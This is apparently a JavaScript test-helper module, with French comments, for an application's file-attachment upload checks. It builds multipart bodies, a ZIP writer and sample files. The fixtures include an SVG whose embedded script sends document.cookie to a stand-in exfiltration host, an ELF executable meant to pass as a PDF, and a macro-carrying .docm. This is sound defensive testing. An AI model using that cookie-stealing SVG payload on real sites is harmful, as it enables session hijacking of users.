/**
 * aide.mjs — monter la chaîne des pièces jointes **sur le vrai greffon d'API**,
 * et fabriquer de quoi l'éprouver.
 *
 * ── Ce que ce montage a de particulier, et ce qu'il a coûté ──────────────────
 *
 * `greffonApi` est appelé **directement** plutôt que par `register()` : c'est une
 * fonction de greffon ordinaire, et appelée sans encapsulation elle pose ses
 * crochets sur l'instance racine. Les routes des pièces jointes — qu'elle
 * enregistre elle-même — passent donc par :
 *
 *   · le crochet `onRequest` réel : rythme, authentification, `deciderAcces` sur
 *     la déclaration portée par chaque route ;
 *   · le traitement d'erreur réel, celui qui garantit qu'aucun message de
 *     PostgreSQL ne sort ;
 *   · l'analyseur de type de contenu du greffon des pièces, donc le **contrôle
 *     n° 1** du §31.2.
 *
 * ⚠️ **Le second enregistrement est CONDITIONNEL, et il a fallu qu'il le devienne.**
 * `src/api/index.ts` enregistre le greffon des pièces jointes ; s'il ne lui passe
 * que le pool, celui-ci n'ouvre aucune route (voir l'entête de
 * `src/pieces/index.ts`) et le banc n'aurait rien à interroger — d'où un second
 * enregistrement, posé ici avec la configuration. Mais si le point d'entrée la
 * passe, Fastify refuse le doublon : *« Method 'POST' already declared for route
 * '/api/pieces/:entite/:entiteId' »*.
 *
 * **Les deux états ont été observés à une heure d'intervalle** — la couture
 * branchée, puis débranchée — pendant que quatre agents écrivaient. Le banc ne
 * choisit donc pas : il **constate**. Le crochet `onRoute` compte ce que
 * `greffonApi` a monté ; si c'est zéro, il pose le second enregistrement.
 *
 * Ce que cela préserve : quand la couture est branchée, les routes éprouvées sont
 * **celles que `src/api/index.ts` monte**, et la ligne d'enregistrement est
 * éprouvée par construction. Quand elle ne l'est pas, la famille mesure quand
 * même la chaîne — et `test/pieces/ingestion.test.mjs` dit alors, par le nombre
 * de routes, laquelle des deux situations elle a rencontrée.
 *
 * ── Les chemins du magasin ───────────────────────────────────────────────────
 *
 * La configuration vient du harnais partagé (une seule source pour la vingtaine
 * de variables d'environnement), et **seuls les trois chemins de stockage sont
 * réécrits** vers un répertoire jetable. Les recopier tous ferait une seconde
 * source de vérité ; n'en réécrire aucun ferait écrire le banc dans
 * `/var/lib/cyber-grc`.
 */

import { deflateRawSync } from 'node:zlib';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { moduleCompile, monterGreffon } from '../aide/serveur.mjs';

/* =====================================================================
 *  Session d'essai
 * ===================================================================== */

/**
 * Session qui dit **qui parle** et **quels droits l'accompagnent**.
 *
 * Contrat respecté à la lettre : `resoudre()` ne prend aucun argument, et rien
 * ici ne lit la requête. Un résolveur d'essai qui lirait une entête
 * réintroduirait ce que le contrôle S2 interdit.
 */
export class SessionDEssai {
  constructor(perimetre, droits) {
    this.provisoire = false;
    this._perimetre = Object.freeze({ ...perimetre });
    this._droits = Object.freeze({ ...droits });
  }

  /** Change la session entre deux appels. Jamais depuis une requête. */
  poser(perimetre, droits) {
    this._perimetre = Object.freeze({ ...perimetre });
    if (droits !== undefined) this._droits = Object.freeze({ ...droits });
  }

  async resoudre() {
    return this._perimetre;
  }

  async authentifier() {
    return { perimetre: this._perimetre, droits: this._droits };
  }

  decrire() {
    return 'session fixée par le banc d’essai (test/pieces/aide.mjs)';
  }
}

/** Périmètre d'une session mono-filiale. */
export function perimetreDe(utilisateurId, filialeId, filiales = [filialeId]) {
  return {
    utilisateurId,
    filialeId,
    filiales,
    perimetreGroupe: false,
    administrationGroupe: false,
  };
}

/* =====================================================================
 *  Montage
 * ===================================================================== */

/**
 * Monte `greffonApi` — qui enregistre lui-même `greffonPieces` — et rend de quoi
 * l'interroger.
 *
 * @param {{nom: string}} base base d'essai ouverte par `ouvrirBaseEssai`
 * @param {SessionDEssai} session
 * @param {{chemins?: Record<string,string>, piecesJointes?: Record<string,unknown>,
 *          environnement?: string}} [ecarts] réglages que CET essai veut différents
 */
export async function monterPieces(base, session, ecarts = {}) {
  const { default: Fastify } = await import('fastify');
  const { creerPool } = await moduleCompile('db/pool.js');
  const { greffonApi } = await moduleCompile('api/index.js');
  const { greffonPieces } = await moduleCompile('pieces/index.js');

  // Configuration du harnais partagé, puis un montage jetable qu'on referme :
  // deux copies d'un même réglage finissent par ne plus dire la même chose.
  const provisoire = await monterGreffon(base, perimetreDe('systeme', null, []));
  const configBase = provisoire.config;
  await provisoire.fermer();

  const magasin = await mkdtemp(join(tmpdir(), 'grc-pj-'));
  const config = {
    ...configBase,
    ...(ecarts.environnement === undefined ? {} : { environnement: ecarts.environnement }),
    chemins: {
      ...configBase.chemins,
      piecesJointes: join(magasin, 'pieces'),
      quarantaine: join(magasin, 'quarantaine'),
      temporaire: join(magasin, 'attente'),
      ...ecarts.chemins,
    },
    piecesJointes: { ...configBase.piecesJointes, ...ecarts.piecesJointes },
  };

  const pool = creerPool(config.base);
  const instance = Fastify({ logger: false, bodyLimit: config.serveur.tailleMaxCorpsOctets });

  /** Déclarations d'accès telles que Fastify les voit — lues, jamais recopiées. */
  const routes = [];
  instance.addHook('onRoute', (route) => {
    if (typeof route.url === 'string' && route.url.startsWith('/api/pieces')) {
      routes.push({ methode: route.method, url: route.url, acces: route.config?.acces });
    }
  });

  await greffonApi(instance, { pool, config, resolveur: session, authentificateur: session });
  // ⚠️ Conditionnel — voir l'entête. On CONSTATE ce que le point d'entrée a monté
  // plutôt que de supposer l'un des deux états de la couture.
  const coutureBranchee = routes.length > 0;
  if (!coutureBranchee) await greffonPieces(instance, { pool, config });
  await instance.ready();

  return {
    instance,
    config,
    pool,
    magasin,
    routes,
    /** Le point d'entrée a-t-il monté les routes lui-même ? */
    coutureBranchee,

    /** `inject()` : rend `{ statut, entetes, corps, brut }`. */
    async appeler(methode, url, options = {}) {
      const reponse = await instance.inject({
        method: methode,
        url,
        ...(options.corps === undefined ? {} : { payload: options.corps }),
        ...(options.entetes === undefined ? {} : { headers: options.entetes }),
      });
      let corps = reponse.body;
      if ((reponse.headers['content-type'] ?? '').includes('application/json')) {
        try {
          corps = JSON.parse(reponse.body);
        } catch {
          /* Réponse annoncée JSON mais illisible : c'est un constat en soi. */
        }
      }
      return {
        statut: reponse.statusCode,
        entetes: reponse.headers,
        corps,
        brut: reponse.rawPayload,
      };
    },

    /** Dépose un fichier et rend la réponse. */
    async deposer(url, fichier, extras = []) {
      const enveloppe = corpsMultipart([
        {
          nom: 'fichier',
          nomFichier: fichier.nom,
          type: fichier.type,
          contenu: fichier.contenu,
        },
        ...extras,
      ]);
      return this.appeler('POST', url, {
        corps: enveloppe.corps,
        entetes: {
          'content-type': enveloppe.contentType,
          'content-length': String(enveloppe.corps.length),
        },
      });
    },

    async fermer() {
      instance.server.closeAllConnections?.();
      await instance.close().catch(() => {});
      await pool.end().catch(() => {});
      await rm(magasin, { recursive: true, force: true }).catch(() => {});
    },
  };
}

/* =====================================================================
 *  Corps multipart — écrit d'après le RFC, pas d'après l'analyseur
 * ===================================================================== */

/**
 * Construit un corps `multipart/form-data`.
 *
 * Il est écrit **indépendamment** de `src/pieces/multipart.ts` : un producteur
 * dérivé de l'analyseur qu'il éprouve ne prouverait que leur accord.
 */
export function corpsMultipart(parties, frontiere = `----EssaiGRC${Math.random().toString(36).slice(2)}`) {
  const blocs = [];
  for (const partie of parties) {
    let entete = `--${frontiere}\r\nContent-Disposition: form-data; name="${partie.nom}"`;
    if (partie.nomFichier !== undefined) entete += `; filename="${partie.nomFichier}"`;
    entete += '\r\n';
    if (partie.type !== undefined && partie.type !== null) {
      entete += `Content-Type: ${partie.type}\r\n`;
    }
    entete += '\r\n';
    blocs.push(Buffer.from(entete, 'utf8'));
    blocs.push(Buffer.isBuffer(partie.contenu) ? partie.contenu : Buffer.from(String(partie.contenu), 'utf8'));
    blocs.push(Buffer.from('\r\n', 'latin1'));
  }
  blocs.push(Buffer.from(`--${frontiere}--\r\n`, 'latin1'));
  return { corps: Buffer.concat(blocs), contentType: `multipart/form-data; boundary=${frontiere}` };
}

/* =====================================================================
 *  Un écrivain ZIP minimal — pour fabriquer de vrais conteneurs Office
 * ---------------------------------------------------------------------
 *  Il ne partage aucune ligne avec `src/pieces/zip.ts`, qui lit : l'un écrit
 *  d'après le format, l'autre lit d'après le format, et c'est le format qui les
 *  met d'accord. Un fabricant dérivé du lecteur ne prouverait rien.
 * ===================================================================== */

const TABLE_CRC = (() => {
  const table = new Uint32Array(256);
  for (let n = 0; n < 256; n += 1) {
    let c = n;
    for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    table[n] = c >>> 0;
  }
  return table;
})();

function crc32(donnees) {
  let c = 0xffffffff;
  for (const octet of donnees) c = TABLE_CRC[(c ^ octet) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

/** Assemble un ZIP « dégonflé » à partir d'entrées `{nom, contenu}`. */
export function zipMinimal(entrees) {
  const locaux = [];
  const centraux = [];
  let decalage = 0;

  for (const entree of entrees) {
    const nom = Buffer.from(entree.nom, 'utf8');
    const donnees = Buffer.isBuffer(entree.contenu) ? entree.contenu : Buffer.from(entree.contenu, 'utf8');
    const compresse = deflateRawSync(donnees);
    const crc = crc32(donnees);

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(8, 8);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(compresse.length, 18);
    local.writeUInt32LE(donnees.length, 22);
    local.writeUInt16LE(nom.length, 26);
    locaux.push(local, nom, compresse);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(8, 10);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(compresse.length, 20);
    central.writeUInt32LE(donnees.length, 24);
    central.writeUInt16LE(nom.length, 28);
    central.writeUInt32LE(decalage, 42);
    centraux.push(central, nom);

    decalage += local.length + nom.length + compresse.length;
  }

  const corpsLocaux = Buffer.concat(locaux);
  const corpsCentraux = Buffer.concat(centraux);
  const fin = Buffer.alloc(22);
  fin.writeUInt32LE(0x06054b50, 0);
  fin.writeUInt16LE(entrees.length, 8);
  fin.writeUInt16LE(entrees.length, 10);
  fin.writeUInt32LE(corpsCentraux.length, 12);
  fin.writeUInt32LE(corpsLocaux.length, 16);
  return Buffer.concat([corpsLocaux, corpsCentraux, fin]);
}

/* =====================================================================
 *  Fichiers d'essai
 * ===================================================================== */

/** PDF minimal, mais un vrai : en-tête, un objet, une fin de fichier. */
export function pdfValide(texte = 'rapport de test PRA') {
  return Buffer.from(
    `%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R /Info (${texte}) >>\n%%EOF\n`,
    'latin1',
  );
}

/** PNG 1×1 réel — en-tête, IHDR, IDAT, IEND. */
export function pngValide() {
  return Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
    'base64',
  );
}

/** JPEG minimal : SOI, APP0/JFIF, EOI. */
export function jpegValide() {
  return Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]),
    Buffer.from('JFIF\0', 'latin1'),
    Buffer.from([0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00]),
    Buffer.from([0xff, 0xd9]),
  ]);
}

const TYPES_OOXML = {
  docx: {
    principale: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml',
    partie: 'word/document.xml',
  },
  xlsx: {
    principale: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml',
    partie: 'xl/workbook.xml',
  },
  pptx: {
    principale:
      'application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml',
    partie: 'ppt/presentation.xml',
  },
  docm: {
    principale: 'application/vnd.ms-word.document.macroEnabled.main+xml',
    partie: 'word/document.xml',
  },
};

/** Conteneur Office réel, avec son `[Content_Types].xml` et sa partie principale. */
export function ooxml(cle) {
  const forme = TYPES_OOXML[cle];
  if (forme === undefined) throw new Error(`type OOXML inconnu dans le banc : ${cle}`);
  const entrees = [
    {
      nom: '[Content_Types].xml',
      contenu:
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
        `<Override PartName="/${forme.partie}" ContentType="${forme.principale}"/>` +
        '</Types>',
    },
    { nom: '_rels/.rels', contenu: '<?xml version="1.0"?><Relationships/>' },
    { nom: forme.partie, contenu: '<?xml version="1.0"?><document/>' },
  ];
  // Un vrai `.docm` porte son projet VBA : c'est ce qui le rend dangereux, et
  // c'est ce que la chaîne doit voir même après un renommage.
  if (cle === 'docm') entrees.push({ nom: 'word/vbaProject.bin', contenu: Buffer.from([0xd0, 0xcf, 0x11, 0xe0]) });
  return zipMinimal(entrees);
}

/** Archive ZIP ordinaire — sans `[Content_Types].xml`. */
export function archiveNue() {
  return zipMinimal([
    { nom: 'notes.txt', contenu: 'des notes' },
    { nom: 'dossier/autre.txt', contenu: 'et une autre' },
  ]);
}

/**
 * Exécutable ELF — en-tête réel, suivi d'octets nuls comme tout binaire.
 *
 * C'est le fichier que l'on renomme `.pdf` : il ne porte aucune trace de PDF,
 * et son en-tête est celui qu'un noyau Linux exécuterait.
 */
export function executableElf() {
  const entete = Buffer.alloc(64);
  entete.write('\x7fELF', 0, 'latin1');
  entete[4] = 2; // 64 bits
  entete[5] = 1; // petit-boutiste
  entete[6] = 1; // version
  entete.writeUInt16LE(2, 16); // ET_EXEC
  entete.writeUInt16LE(0x3e, 18); // x86-64
  return Buffer.concat([entete, Buffer.from('charge utile', 'latin1'), Buffer.alloc(32)]);
}

/** SVG portant du script — le format que le §31.3 refuse explicitement comme logo. */
export function svgAvecScript() {
  return Buffer.from(
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">' +
      '<script>fetch("//exfiltration.invalide/"+document.cookie)</script></svg>',
    'utf8',
  );
}

/**
 * La signature EICAR — fichier d'essai antivirus standard, inoffensif.
 *
 * Elle est déposée en `.txt` **à dessein** : sous son extension d'origine
 * (`.com`), la liste blanche la refuserait au contrôle n° 3, et l'analyse
 * antivirale ne serait jamais atteinte. C'est en `.txt` qu'elle éprouve le
 * contrôle n° 7, c'est-à-dire ce que ce banc veut mesurer.
 */
export const EICAR = Buffer.from(
  ['X5O!P%@AP[4', 'PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'].join('\\'),
  'latin1',
);
